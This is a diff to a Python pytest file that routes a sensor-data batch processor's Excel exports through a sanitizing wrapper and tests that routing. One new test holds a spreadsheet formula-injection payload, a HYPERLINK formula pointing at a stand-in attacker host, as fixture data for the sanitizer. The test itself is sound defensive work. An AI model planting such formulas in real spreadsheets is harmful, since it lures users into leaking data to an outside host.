@@ -153,9 +153,19 @@ def mock_dependencies(mocker):
         "os.path.basename", side_effect=lambda p: os.path.split(p)[1]
     )
 
-    # Mock pandas saving
+    # Mock pandas saving at the class level so the safe wrappers still route here
     mock_to_excel = mocker.patch("pandas.DataFrame.to_excel")
     mock_to_csv = mocker.patch("pandas.DataFrame.to_csv")
+
+    # Capture the real wrapper, then replace it with a recording mock that
+    # delegates to the real implementation so sanitization is still exercised.
+    from scripts import spreadsheet_safety as _ss
+
+    real_write_excel_safely = _ss.write_excel_safely
+    mock_write_excel_safely = mocker.patch(
+        "scripts.spreadsheet_safety.write_excel_safely"
+    )
+    mock_write_excel_safely.side_effect = real_write_excel_safely
 
     # Mock builtins.open (for specific data file reads only)
     mock_file_open = mocker.patch(
@@ -171,6 +181,7 @@ def mock_dependencies(mocker):
         "basename": mock_basename,
         "to_excel": mock_to_excel,
         "to_csv": mock_to_csv,
+        "write_excel_safely": mock_write_excel_safely,
         "open": mock_file_open,
         "data_loader": None,  # Explicitly track mocked modules
         "processor": None,
@@ -711,3 +722,47 @@ def test_load_raw_data_empty_file(caplog):
         assert isinstance(result, pd.DataFrame)
         assert result.empty
         assert "dummy_empty_file.txt empty." in caplog.text
+
+
+def test_batch_process_routes_through_write_excel_safely(
+    mock_dependencies, mock_config_loader, mocker
+):
+    """The batch processor must route Excel exports through write_excel_safely
+    and the sanitizer must escape formula-like payloads before to_excel is called.
+    """
+    payload = '=HYPERLINK("http://attacker.example/collect","click")'
+
+    def read_csv_side_effect(path, *args, **kwargs):
+        if str(path).endswith("river_mile_map.csv"):
+            return pd.DataFrame({"SENSOR_ID": [26], "RIVER_MILE": [54.0]})
+        return pd.DataFrame(
+            {
+                0: [1, 2, 3],
+                1: [10.0, 20.0, 30.0],
+                2: [payload, "safe", "safe"],
+            }
+        )
+
+    mocker.patch("pandas.read_csv", side_effect=read_csv_side_effect)
+    mock_dependencies["listdir"].return_value = ["S26_Y01.txt"]
+    mock_dependencies["isfile"].return_value = True
+
+    summary_df = batch_process(
+        BatchConfig(
+            series_selection=26,
+            river_miles=None,
+            years=(1995, 1995),
+            dry_run=False,
+        )
+    )
+
+    assert len(summary_df) == 1
+    mock_write_excel = mock_dependencies["write_excel_safely"]
+    assert mock_write_excel.called
+
+    # The wrapper received the original DataFrame and the expected output path.
+    written_path = mock_write_excel.call_args.args[1]
+    assert written_path.endswith("Year_1995 (Y01)_Data.xlsx")
+    assert mock_write_excel.call_args.kwargs == {"index": False, "header": False}
+    df_passed = mock_write_excel.call_args.args[0]
+    assert df_passed.iloc[0, 2] == payload
